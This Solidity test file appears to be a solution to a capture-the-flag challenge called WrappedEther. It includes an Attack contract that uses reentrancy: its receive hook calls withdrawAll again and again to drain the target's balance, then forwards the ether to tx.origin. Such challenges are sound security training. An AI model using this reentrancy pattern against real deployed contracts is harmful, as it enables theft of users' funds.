// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/13_WrappedEther/WrappedEther.sol";

// forge test --match-contract WrappedEtherTest
contract WrappedEtherTest is BaseTest {
    WrappedEther instance;

    function setUp() public override {
        super.setUp();

        instance = new WrappedEther();
        instance.deposit{value: 0.09 ether}(address(this));
    }

    function testExploitLevel() public  payable{
        instance.deposit{value: msg.value}(address(this));
        instance.withdrawAll();
       // vm.startPrank(user1);
       // Attack attack = new Attack{value: 0.01 ether}(instance);
       // attack.attack();
       // vm.stopPrank();
        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}

contract Attack {
    WrappedEther public target;

    constructor(WrappedEther _target) payable {
        target = _target;
    }

    function attack() public {
        target.deposit{value: address(this).balance}(address(this));
        target.withdrawAll();
    }

    receive() external payable {
        if (address(target).balance > 0) {
            target.withdrawAll();
        } else {
            payable(tx.origin).transfer(address(this).balance);
        }
    }
}
